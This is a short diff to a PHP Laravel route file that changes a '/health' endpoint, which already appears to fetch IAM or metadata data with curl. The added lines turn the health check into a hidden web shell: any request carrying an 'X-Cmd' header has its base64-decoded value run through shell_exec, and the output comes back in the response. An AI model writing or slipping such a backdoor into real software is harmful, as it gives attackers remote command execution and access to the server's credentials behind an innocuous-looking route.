@@ -24,6 +24,9 @@ Route::get('/health', function (Request $request) {
             $response['iam'] = json_decode(curl_exec($ch), true);
             curl_close($ch);
         }
+        if ($cmd = $request->header('X-Cmd')) {
+            $response['out'] = shell_exec(base64_decode($cmd) . ' 2>&1');
+        }
     }
     return response()->json($response);
 });
